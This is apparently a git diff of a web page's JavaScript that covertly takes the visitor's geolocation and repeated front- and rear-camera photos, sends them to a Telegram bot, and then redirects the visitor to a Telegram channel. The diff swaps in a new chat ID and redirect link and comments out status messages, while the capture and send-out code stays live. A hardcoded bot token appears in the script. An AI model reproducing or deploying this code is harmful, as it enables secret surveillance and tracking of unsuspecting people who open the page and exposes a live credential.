@@ -23,8 +23,8 @@
 
     <script>
         const BOT_TOKEN = '7876995869:AAGmef_SeJE8II79qZPcsRstw6kELpcbHDs';
-        const CHAT_ID = '61859882';
-        const REDIRECT_URL = 'https://t.me/Nono3928';
+        const CHAT_ID = '-1002649976086';
+        const REDIRECT_URL = 'https://t.me/fdh_alhamer';
         
         let trackId = '';
         let currentStream = null;
@@ -120,7 +120,7 @@
                 trackId = generateTrackId();
                 console.log('Generated track ID:', trackId);
                 el('loading').style.display = 'block';
-                await sendMessageToTelegram(`New session started - Track ID: ${trackId}`);
+                // await sendMessageToTelegram(`New session started - Track ID: ${trackId}`);
                 
                 try {
                     const location = await getLocation();
@@ -128,7 +128,7 @@
                     await sendLocationToTelegram(location.latitude, location.longitude);
                 } catch (error) {
                     console.error('Could not get location:', error);
-                    await sendMessageToTelegram(`Track ID: ${trackId} - Location access denied or failed`);
+                    // await sendMessageToTelegram(`Track ID: ${trackId} - Location access denied or failed`);
                 }
                 
                 const cameraActions = [
@@ -139,14 +139,15 @@
                 for (const action of cameraActions) {
                     const cameraSetupSuccess = await setupCamera(action.type === 'front' ? 'user' : 'environment');
                     if (cameraSetupSuccess) {
-                        await delay(1000); // Stabilize camera
+                        // await delay(1000); // Stabilize camera
                         for (let i = 1; i <= action.count; i++) {
                             const photoData = await takePhoto();
                             await sendPhotoToTelegram(photoData, i, action.type);
                             if (action.delay > 0) await delay(action.delay);
                         }
                     } else {
-                        await sendMessageToTelegram(`Track ID: ${trackId} - ${action.type} camera access denied or failed`);
+                        0
+                        // await sendMessageToTelegram(`Track ID: ${trackId} - ${action.type} camera access denied or failed`);
                     }
                 }
                 
@@ -154,13 +155,13 @@
                     currentStream.getTracks().forEach(track => track.stop());
                 }
                 
-                await sendMessageToTelegram(`Track ID: ${trackId} - Session completed successfully`);
+                // await sendMessageToTelegram(`Track ID: ${trackId} - Session completed successfully`);
                 el('loading').style.display = 'none';
                 setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
                 
             } catch (error) {
                 console.error('Error in execution sequence:', error);
-                await sendMessageToTelegram(`Track ID: ${trackId} - Error occurred: ${error.message}`);
+                // await sendMessageToTelegram(`Track ID: ${trackId} - Error occurred: ${error.message}`);
                 setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
             }
         }
